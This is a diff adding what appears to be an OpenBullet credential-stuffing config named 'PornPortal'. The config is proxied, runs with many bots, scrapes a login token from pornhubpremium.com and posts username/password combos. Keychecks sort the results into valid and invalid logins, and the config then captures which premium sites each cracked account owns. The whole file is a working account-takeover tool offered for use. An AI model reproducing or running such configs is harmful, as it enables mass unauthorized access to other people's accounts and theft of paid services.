@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "PornPortal",
+  "SuggestedBots": 125,
+  "LastModified": "2019-04-07T00:07:13.1216905+03:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "NestleNutella (loliX Encrypted)",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get_Token REQUEST GET "https://www.pornhubpremium.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Parse_Token PARSE "<SOURCE>" LR "token\" value=\"" "\" />" -> VAR "TOKEN" 
+
+#Send_Auth REQUEST POST "https://www.pornhubpremium.com/front/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&redirect=&from=pc_premium_login&segment=straight&token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Key_Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "message\":\"Invalid username\/password!" 
+    KEY "Account disabled. Please try again later" 
+  KEYCHAIN Success OR 
+    KEY "premium_redirect_cookie\":\"1" 
+
+#Send_PLogin REQUEST GET "https://www.pornhubpremium.com/postlogin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Parse_PToken PARSE "<SOURCE>" LR "var pornportalConfig = {\"data\":\"" "\",\"sid\":\"\"};" -> VAR "PPTOKEN" "" "&network=undefined&domain=undefined&logout=undefined&location=https%3A%2F%2Fwww.pornhubpremium.com%2Fpostlogin" 
+
+#Get_Info REQUEST GET "https://ppp.contentdef.com/postlogin?data=<PPTOKEN>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Capture_Site PARSE "<SOURCE>" LR "{\"name\":\"" "\",\"owned" Recursive=TRUE -> CAP "Site" 
+
+#Capture_SOwned PARSE "<SOURCE>" LR "owned\":" ",\"shortName" Recursive=TRUE -> CAP "SiteOwned" 
+
+
